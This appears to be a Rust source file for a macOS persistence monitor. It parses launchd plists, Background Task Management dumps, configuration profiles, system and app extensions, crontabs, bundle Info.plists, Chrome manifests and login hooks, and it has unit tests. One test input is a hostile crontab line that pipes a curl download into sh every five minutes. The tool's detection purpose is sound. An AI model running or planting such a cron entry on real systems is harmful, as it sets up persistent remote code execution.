//! Pure parsers for persistence sources (no I/O): launchd plists, `sfltool dumpbtm`,
//! `profiles show -output stdout-xml`, `systemextensionsctl list`, `pluginkit -mAvvv`, crontabs,
//! bundle `Info.plist`, Chrome `manifest.json`.

use std::io::Cursor;

use crate::util::clip;
use crate::MonitorError;

/// Max arguments / characters kept from untrusted lists.
pub(crate) const MAX_ITEMS: usize = 64;
pub(crate) const MAX_CHARS: usize = 4096;

/// Parses an XML or binary property list.
pub fn parse_plist(bytes: &[u8]) -> Result<plist::Value, MonitorError> {
    plist::Value::from_reader(Cursor::new(bytes))
        .map_err(|e| MonitorError::Parse(format!("plist: {e}")))
}

fn dict_str(d: &plist::Dictionary, key: &str) -> Option<String> {
    d.get(key)
        .and_then(|v| v.as_string())
        .map(|s| clip(s, MAX_CHARS))
        .filter(|s| !s.is_empty())
}

// ---------------------------------------------------------------------------------------------
// launchd
// ---------------------------------------------------------------------------------------------

/// The fields of a launchd job plist that matter for persistence.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct LaunchdPlist {
    pub label: Option<String>,
    /// `Program`, else `ProgramArguments[0]`.
    pub program: Option<String>,
    /// `ProgramArguments[1..]` (argv[0] is the program).
    pub arguments: Vec<String>,
    pub run_at_load: bool,
    /// `KeepAlive` true or a (non-empty) conditions dictionary.
    pub keep_alive: bool,
    pub disabled: bool,
    /// `UserName` (daemons): account the job runs as.
    pub user_name: Option<String>,
}

/// Parses a launchd job plist (XML or binary).
pub fn parse_launchd_plist(bytes: &[u8]) -> Result<LaunchdPlist, MonitorError> {
    let v = parse_plist(bytes)?;
    let d = v
        .as_dictionary()
        .ok_or_else(|| MonitorError::Parse("launchd plist is not a dictionary".into()))?;
    let args: Vec<String> = d
        .get("ProgramArguments")
        .and_then(|a| a.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_string())
                .take(MAX_ITEMS + 1)
                .map(|s| clip(s, MAX_CHARS))
                .collect()
        })
        .unwrap_or_default();
    let program =
        dict_str(d, "Program").or_else(|| args.first().cloned().filter(|s| !s.is_empty()));
    let keep_alive = match d.get("KeepAlive") {
        Some(plist::Value::Boolean(b)) => *b,
        Some(plist::Value::Dictionary(c)) => !c.is_empty(),
        _ => false,
    };
    Ok(LaunchdPlist {
        label: dict_str(d, "Label"),
        program,
        arguments: args.into_iter().skip(1).collect(),
        run_at_load: d
            .get("RunAtLoad")
            .and_then(|b| b.as_boolean())
            .unwrap_or(false),
        keep_alive,
        disabled: d
            .get("Disabled")
            .and_then(|b| b.as_boolean())
            .unwrap_or(false),
        user_name: dict_str(d, "UserName"),
    })
}

// ---------------------------------------------------------------------------------------------
// sfltool dumpbtm
// ---------------------------------------------------------------------------------------------

/// One Background Task Management record from `sfltool dumpbtm`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct BtmRecord {
    /// From the `Records for UID <n> : <uuid>` header (-2 = system).
    pub uid: Option<i64>,
    pub uuid: Option<String>,
    pub name: Option<String>,
    pub developer_name: Option<String>,
    pub team_id: Option<String>,
    /// Type text without the code, e.g. `legacy daemon`, `login item`, `app`.
    pub item_type: String,
    /// Hex code in parentheses, e.g. `0x10010`.
    pub type_code: Option<u64>,
    pub disposition: Option<String>,
    pub identifier: Option<String>,
    pub url: Option<String>,
    pub executable_path: Option<String>,
    pub parent_identifier: Option<String>,
    pub bundle_identifier: Option<String>,
}

fn null_to_none(v: &str) -> Option<String> {
    let v = v.trim();
    if v.is_empty() || v == "(null)" {
        None
    } else {
        Some(clip(v, MAX_CHARS))
    }
}

/// Splits `legacy daemon (0x10010)` into (`legacy daemon`, `0x10010`).
fn split_type(v: &str) -> (String, Option<u64>) {
    let v = v.trim();
    if let Some(open) = v.rfind('(') {
        let text = v[..open].trim().to_string();
        let code = v[open + 1..].trim_end_matches(')').trim();
        let code = code
            .strip_prefix("0x")
            .and_then(|h| u64::from_str_radix(h, 16).ok())
            .or_else(|| code.parse().ok());
        (text, code)
    } else {
        (v.to_string(), None)
    }
}

/// Parses the text output of `sfltool dumpbtm` (format is not API: best effort, tolerant).
/// Records start with a `#<n>:` line; fields are `Key: value` lines. `Embedded Item Identifiers`
/// sub-lists (`#1: id`) are ignored.
pub fn parse_sfltool_dumpbtm(text: &str) -> Vec<BtmRecord> {
    let mut out = Vec::new();
    let mut uid: Option<i64> = None;
    let mut cur: Option<BtmRecord> = None;
    for line in text.lines() {
        let t = line.trim();
        if t.is_empty() {
            continue;
        }
        if let Some(rest) = t.strip_prefix("Records for UID") {
            if let Some(r) = cur.take() {
                out.push(r);
            }
            let tok: String = rest
                .trim()
                .chars()
                .take_while(|c| *c == '-' || c.is_ascii_digit())
                .collect();
            uid = tok.parse().ok();
            continue;
        }
        if let Some(rest) = t.strip_prefix('#') {
            let rest = rest.trim_end_matches(':').trim();
            if !rest.is_empty() && rest.chars().all(|c| c.is_ascii_digit()) {
                if let Some(r) = cur.take() {
                    out.push(r);
                }
                if out.len() >= 4096 {
                    break;
                }
                cur = Some(BtmRecord {
                    uid,
                    ..Default::default()
                });
            }
            continue;
        }
        let Some(rec) = cur.as_mut() else { continue };
        let Some((key, value)) = t.split_once(':') else {
            continue;
        };
        match key.trim() {
            "UUID" => rec.uuid = null_to_none(value),
            "Name" => rec.name = null_to_none(value),
            "Developer Name" => rec.developer_name = null_to_none(value),
            "Team Identifier" => rec.team_id = null_to_none(value),
            "Type" => {
                let (ty, code) = split_type(value);
                rec.item_type = ty;
                rec.type_code = code;
            }
            "Disposition" => rec.disposition = null_to_none(value),
            "Identifier" | "Indentifier" => rec.identifier = null_to_none(value),
            "URL" => rec.url = null_to_none(value),
            "Executable Path" => rec.executable_path = null_to_none(value),
            "Parent Identifier" => rec.parent_identifier = null_to_none(value),
            "Bundle Identifier" => rec.bundle_identifier = null_to_none(value),
            _ => {}
        }
    }
    if let Some(r) = cur.take() {
        out.push(r);
    }
    out
}

/// `file:///Applications/LuLu.app/` -> `/Applications/LuLu.app` (percent-decoded); other URLs
/// are returned unchanged.
pub fn file_url_to_path(url: &str) -> String {
    let Some(rest) = url.strip_prefix("file://") else {
        return url.to_string();
    };
    let rest = rest.strip_prefix("localhost").unwrap_or(rest);
    let bytes = rest.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    let hex = |b: u8| (b as char).to_digit(16).map(|d| d as u8);
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex(bytes[i + 1]), hex(bytes[i + 2])) {
                out.push(h * 16 + l);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    let mut s = String::from_utf8_lossy(&out).into_owned();
    while s.len() > 1 && s.ends_with('/') {
        s.pop();
    }
    s
}

// ---------------------------------------------------------------------------------------------
// profiles show -output stdout-xml
// ---------------------------------------------------------------------------------------------

/// One installed configuration profile.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ProfileRecord {
    /// `None` for device (computer-level) profiles, else the user name.
    pub user: Option<String>,
    pub identifier: String,
    pub display_name: Option<String>,
    pub uuid: Option<String>,
    pub organization: Option<String>,
    /// Sorted, de-duplicated `PayloadType`s of `ProfileItems`.
    pub payload_types: Vec<String>,
}

/// Parses `profiles show -output stdout-xml`: a dictionary whose keys are `_computerlevel` or user
/// names, each an array of profile dictionaries (`ProfileIdentifier`, `ProfileDisplayName`,
/// `ProfileUUID`, `ProfileOrganization`, `ProfileItems[].PayloadType`). Empty input -> no profiles.
pub fn parse_profiles_xml(bytes: &[u8]) -> Result<Vec<ProfileRecord>, MonitorError> {
    if bytes.iter().all(|b| b.is_ascii_whitespace()) {
        return Ok(Vec::new());
    }
    let v = parse_plist(bytes)?;
    let d = v
        .as_dictionary()
        .ok_or_else(|| MonitorError::Parse("profiles output is not a dictionary".into()))?;
    let mut out = Vec::new();
    for (scope, list) in d.iter() {
        let user = if scope == "_computerlevel" {
            None
        } else {
            Some(clip(scope, 256))
        };
        let Some(arr) = list.as_array() else { continue };
        for p in arr.iter().take(512) {
            let Some(pd) = p.as_dictionary() else {
                continue;
            };
            let Some(identifier) = dict_str(pd, "ProfileIdentifier") else {
                continue;
            };
            let mut payload_types: Vec<String> = pd
                .get("ProfileItems")
                .and_then(|i| i.as_array())
                .map(|items| {
                    items
                        .iter()
                        .take(256)
                        .filter_map(|i| i.as_dictionary().and_then(|d| dict_str(d, "PayloadType")))
                        .collect()
                })
                .unwrap_or_default();
            payload_types.sort();
            payload_types.dedup();
            out.push(ProfileRecord {
                user: user.clone(),
                identifier,
                display_name: dict_str(pd, "ProfileDisplayName"),
                uuid: dict_str(pd, "ProfileUUID"),
                organization: dict_str(pd, "ProfileOrganization"),
                payload_types,
            });
        }
    }
    Ok(out)
}

// ---------------------------------------------------------------------------------------------
// systemextensionsctl list
// ---------------------------------------------------------------------------------------------

/// One row of `systemextensionsctl list`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct SysExtRecord {
    /// e.g. `com.apple.system_extension.network_extension`.
    pub category: Option<String>,
    pub enabled: bool,
    pub active: bool,
    pub team_id: Option<String>,
    pub bundle_id: String,
    pub version: Option<String>,
    pub name: Option<String>,
    /// e.g. `activated enabled`.
    pub state: Option<String>,
}

/// Parses `systemextensionsctl list` (tab-separated rows under `--- <category>` headers):
/// `enabled<TAB>active<TAB>teamID<TAB>bundleID (version)<TAB>name<TAB>[state]`.
pub fn parse_systemextensionsctl(text: &str) -> Vec<SysExtRecord> {
    let mut out = Vec::new();
    let mut category: Option<String> = None;
    for line in text.lines() {
        if let Some(c) = line.trim().strip_prefix("---") {
            category = null_to_none(c);
            continue;
        }
        let cols: Vec<&str> = line.split('\t').collect();
        if cols.len() < 6 || cols[0].trim() == "enabled" {
            continue;
        }
        let bundle_col = cols[3].trim();
        let (bundle_id, version) = match bundle_col.find(" (") {
            Some(i) => (
                bundle_col[..i].trim().to_string(),
                Some(bundle_col[i + 2..].trim_end_matches(')').to_string()),
            ),
            None => (bundle_col.to_string(), None),
        };
        if bundle_id.is_empty() {
            continue;
        }
        out.push(SysExtRecord {
            category: category.clone(),
            enabled: cols[0].trim() == "*",
            active: cols[1].trim() == "*",
            team_id: null_to_none(cols[2]),
            bundle_id: clip(&bundle_id, 512),
            version,
            name: null_to_none(cols[4]),
            state: null_to_none(cols[5].trim().trim_start_matches('[').trim_end_matches(']')),
        });
        if out.len() >= 1024 {
            break;
        }
    }
    out
}

// ---------------------------------------------------------------------------------------------
// pluginkit -mAvvv
// ---------------------------------------------------------------------------------------------

/// One app extension registered with PlugInKit.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct PluginRecord {
    pub bundle_id: String,
    pub version: Option<String>,
    pub path: Option<String>,
    pub uuid: Option<String>,
    pub sdk: Option<String>,
    pub display_name: Option<String>,
    pub parent_bundle: Option<String>,
    pub parent_name: Option<String>,
}

/// Parses `pluginkit -mAvvv -p <protocol>`: a header line `[+-!=?] bundle.id(version)` followed by
/// indented `Key = Value` lines (`Path`, `UUID`, `SDK`, `Display Name`, `Parent Bundle`…).
pub fn parse_pluginkit(text: &str) -> Vec<PluginRecord> {
    let mut out: Vec<PluginRecord> = Vec::new();
    for line in text.lines() {
        let t = line.trim();
        if t.is_empty() {
            continue;
        }
        if let Some((k, v)) = t.split_once(" = ") {
            let Some(rec) = out.last_mut() else { continue };
            let v = null_to_none(v);
            match k.trim() {
                "Path" => rec.path = v,
                "UUID" => rec.uuid = v,
                "SDK" => rec.sdk = v,
                "Display Name" => rec.display_name = v,
                "Parent Bundle" => rec.parent_bundle = v,
                "Parent Name" => rec.parent_name = v,
                _ => {}
            }
            continue;
        }
        // Header: optional election marker, then `id(version)`.
        let h = t.trim_start_matches(['+', '-', '!', '=', '?']).trim();
        if let (Some(open), true) = (h.find('('), h.ends_with(')')) {
            let id = h[..open].trim();
            if !id.is_empty() && !id.contains(char::is_whitespace) {
                if out.len() >= 1024 {
                    break;
                }
                out.push(PluginRecord {
                    bundle_id: clip(id, 512),
                    version: null_to_none(&h[open + 1..h.len() - 1]),
                    ..Default::default()
                });
            }
        }
    }
    out
}

// ---------------------------------------------------------------------------------------------
// crontab, Info.plist, Chrome manifest, loginwindow hooks
// ---------------------------------------------------------------------------------------------

/// Non-comment, non-empty lines of a crontab (bounded).
pub fn crontab_entries(text: &str) -> Vec<String> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .take(MAX_ITEMS)
        .map(|l| clip(l, 512))
        .collect()
}

/// `CFBundleIdentifier`, `CFBundleExecutable`, version (`CFBundleShortVersionString`, else
/// `CFBundleVersion`) of a bundle `Info.plist`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct BundleInfo {
    pub identifier: Option<String>,
    pub executable: Option<String>,
    pub version: Option<String>,
}

/// Parses a bundle `Info.plist`.
pub fn parse_bundle_info(bytes: &[u8]) -> Result<BundleInfo, MonitorError> {
    let v = parse_plist(bytes)?;
    let d = v
        .as_dictionary()
        .ok_or_else(|| MonitorError::Parse("Info.plist is not a dictionary".into()))?;
    Ok(BundleInfo {
        identifier: dict_str(d, "CFBundleIdentifier"),
        executable: dict_str(d, "CFBundleExecutable").filter(|e| !e.contains('/') && e != ".."),
        version: dict_str(d, "CFBundleShortVersionString")
            .or_else(|| dict_str(d, "CFBundleVersion")),
    })
}

/// Name, version and default locale of a Chrome extension `manifest.json`.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ChromeManifest {
    /// Raw name, possibly `__MSG_key__`.
    pub name: String,
    pub version: Option<String>,
    pub default_locale: Option<String>,
}

/// Parses a Chrome extension manifest.
pub fn parse_chrome_manifest(bytes: &[u8]) -> Result<ChromeManifest, MonitorError> {
    let v: serde_json::Value = serde_json::from_slice(bytes)
        .map_err(|e| MonitorError::Parse(format!("manifest.json: {e}")))?;
    let s = |k: &str| {
        v.get(k)
            .and_then(|x| x.as_str())
            .map(|x| clip(x, 512))
            .filter(|x| !x.is_empty())
    };
    Ok(ChromeManifest {
        name: s("name").unwrap_or_default(),
        version: s("version"),
        default_locale: s("default_locale").filter(|l| !l.contains('/') && !l.contains("..")),
    })
}

/// `__MSG_appName__` -> `Some("appName")`.
pub fn chrome_message_key(name: &str) -> Option<&str> {
    name.strip_prefix("__MSG_")
        .and_then(|r| r.strip_suffix("__"))
        .filter(|k| !k.is_empty())
}

/// Looks up `key` (case-insensitive) in a `_locales/<l>/messages.json`.
pub fn chrome_message(messages_json: &[u8], key: &str) -> Option<String> {
    let v: serde_json::Value = serde_json::from_slice(messages_json).ok()?;
    let obj = v.as_object()?;
    obj.iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(key))
        .and_then(|(_, m)| m.get("message"))
        .and_then(|m| m.as_str())
        .map(|m| clip(m, 512))
        .filter(|m| !m.is_empty())
}

/// `LoginHook` / `LogoutHook` scripts from a `com.apple.loginwindow` plist.
pub fn parse_login_hooks(bytes: &[u8]) -> Result<Vec<(String, String)>, MonitorError> {
    let v = parse_plist(bytes)?;
    let Some(d) = v.as_dictionary() else {
        return Ok(Vec::new());
    };
    Ok(["LoginHook", "LogoutHook"]
        .iter()
        .filter_map(|k| dict_str(d, k).map(|p| (k.to_string(), p)))
        .collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fx(name: &str) -> Vec<u8> {
        std::fs::read(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("tests/fixtures")
                .join(name),
        )
        .unwrap()
    }

    #[test]
    fn launchd_xml_and_binary() {
        let p = parse_launchd_plist(&fx("launchd_agent.plist")).unwrap();
        assert_eq!(p.label.as_deref(), Some("com.example.updater"));
        assert_eq!(
            p.program.as_deref(),
            Some("/Users/q/Library/Application Support/Example/updater")
        );
        assert_eq!(
            p.arguments,
            vec!["--background".to_string(), "--silent".to_string()]
        );
        assert!(p.run_at_load);
        assert!(p.keep_alive);
        assert!(!p.disabled);

        let d = parse_launchd_plist(&fx("launchd_daemon.plist")).unwrap();
        assert_eq!(
            d.program.as_deref(),
            Some("/Library/PrivilegedHelperTools/com.example.helper")
        );
        assert!(d.arguments.is_empty());
        assert_eq!(d.user_name.as_deref(), Some("_example"));
        assert!(d.keep_alive, "KeepAlive dictionary counts as keep-alive");

        // Same job serialized as a binary plist.
        let v = parse_plist(&fx("launchd_agent.plist")).unwrap();
        let mut bin = Vec::new();
        v.to_writer_binary(&mut bin).unwrap();
        assert_eq!(parse_launchd_plist(&bin).unwrap(), p);

        assert!(parse_launchd_plist(b"not a plist").is_err());
    }

    #[test]
    fn sfltool_output() {
        let text = String::from_utf8(fx("sfltool_dumpbtm.txt")).unwrap();
        let recs = parse_sfltool_dumpbtm(&text);
        assert_eq!(recs.len(), 5, "{recs:#?}");
        let docker = &recs[0];
        assert_eq!(docker.uid, Some(501));
        assert_eq!(docker.name.as_deref(), Some("Docker"));
        assert_eq!(docker.item_type, "app");
        assert_eq!(docker.type_code, Some(0x2));
        assert_eq!(
            docker.url.as_deref(),
            Some("file:///Applications/Docker.app/")
        );
        let vmnetd = &recs[1];
        assert_eq!(vmnetd.item_type, "legacy daemon");
        assert_eq!(vmnetd.type_code, Some(0x10010));
        assert_eq!(
            vmnetd.executable_path.as_deref(),
            Some("/Library/PrivilegedHelperTools/com.docker.vmnetd")
        );
        assert_eq!(vmnetd.identifier.as_deref(), Some("16.com.docker.vmnetd"));
        assert_eq!(vmnetd.developer_name.as_deref(), Some("Docker Inc"));
        let login = &recs[2];
        assert_eq!(login.item_type, "login item");
        assert_eq!(login.team_id, None);
        let sys = &recs[3];
        assert_eq!(sys.uid, Some(-2));
        assert_eq!(sys.item_type, "curated legacy daemon");
        // DumpBTM-style typo "Indentifier" is accepted
        assert_eq!(
            recs[4].identifier.as_deref(),
            Some("com.objective-see.lulu.app")
        );
        assert_eq!(
            file_url_to_path("file:///Applications/My%20App.app/"),
            "/Applications/My App.app"
        );
        assert_eq!(file_url_to_path("https://x"), "https://x");
        assert_eq!(file_url_to_path("file:///bad%zz"), "/bad%zz");
        assert_eq!(file_url_to_path("file:///trail%2"), "/trail%2");
    }

    #[test]
    fn profiles_output() {
        let recs = parse_profiles_xml(&fx("profiles_show.xml")).unwrap();
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[0].user, None);
        assert_eq!(recs[0].identifier, "com.example.mdm.root");
        assert_eq!(
            recs[0].payload_types,
            vec![
                "com.apple.TCC.configuration-profile-policy".to_string(),
                "com.apple.security.root".to_string()
            ]
        );
        assert_eq!(recs[1].user.as_deref(), Some("q"));
        assert_eq!(recs[1].display_name.as_deref(), Some("Proxy"));
        assert!(parse_profiles_xml(b"\n").unwrap().is_empty());
    }

    #[test]
    fn systemextensions_output() {
        let text = String::from_utf8(fx("systemextensionsctl_list.txt")).unwrap();
        let recs = parse_systemextensionsctl(&text);
        assert_eq!(recs.len(), 3);
        assert_eq!(recs[0].bundle_id, "com.objective-see.lulu.extension");
        assert_eq!(recs[0].version.as_deref(), Some("2.6.1/2.6.1"));
        assert_eq!(recs[0].team_id.as_deref(), Some("VBG97UB4TA"));
        assert_eq!(
            recs[0].category.as_deref(),
            Some("com.apple.system_extension.network_extension")
        );
        assert!(recs[0].enabled && recs[0].active);
        assert_eq!(recs[0].state.as_deref(), Some("activated enabled"));
        assert!(!recs[2].enabled);
        assert_eq!(
            recs[2].category.as_deref(),
            Some("com.apple.system_extension.endpoint_security")
        );
    }

    #[test]
    fn pluginkit_output() {
        let text = String::from_utf8(fx("pluginkit_safari.txt")).unwrap();
        let recs = parse_pluginkit(&text);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[0].bundle_id, "org.zotero.zotero.SafariExtension");
        assert_eq!(recs[0].version.as_deref(), Some("5.0.212"));
        assert_eq!(
            recs[0].path.as_deref(),
            Some("/Applications/Zotero.app/Contents/PlugIns/ZoteroSafariExtension.appex")
        );
        assert_eq!(recs[0].display_name.as_deref(), Some("Zotero Connector"));
        assert_eq!(recs[1].bundle_id, "com.example.blocker.ContentBlocker");
        assert_eq!(
            recs[1].sdk.as_deref(),
            Some("com.apple.Safari.content-blocker")
        );
    }

    #[test]
    fn small_parsers() {
        assert_eq!(
            crontab_entries("# comment\n\nSHELL=/bin/sh\n*/5 * * * * curl -s http://x | sh\n"),
            vec![
                "SHELL=/bin/sh".to_string(),
                "*/5 * * * * curl -s http://x | sh".to_string()
            ]
        );
        let info = parse_bundle_info(
            br#"<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict>
            <key>CFBundleIdentifier</key><string>com.example.kext</string>
            <key>CFBundleExecutable</key><string>Example</string>
            <key>CFBundleVersion</key><string>1.2</string></dict></plist>"#,
        )
        .unwrap();
        assert_eq!(info.identifier.as_deref(), Some("com.example.kext"));
        assert_eq!(info.executable.as_deref(), Some("Example"));
        assert_eq!(info.version.as_deref(), Some("1.2"));
        let m = parse_chrome_manifest(
            br#"{"name":"__MSG_appName__","version":"1.2.3","default_locale":"en"}"#,
        )
        .unwrap();
        assert_eq!(chrome_message_key(&m.name), Some("appName"));
        assert_eq!(
            chrome_message(
                br#"{"APPNAME":{"message":"uBlock Origin Lite"}}"#,
                "appName"
            )
            .as_deref(),
            Some("uBlock Origin Lite")
        );
        assert_eq!(m.version.as_deref(), Some("1.2.3"));
        let hooks = parse_login_hooks(
            br#"<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict>
            <key>LoginHook</key><string>/usr/local/bin/hook.sh</string></dict></plist>"#,
        )
        .unwrap();
        assert_eq!(
            hooks,
            vec![(
                "LoginHook".to_string(),
                "/usr/local/bin/hook.sh".to_string()
            )]
        );
    }
}
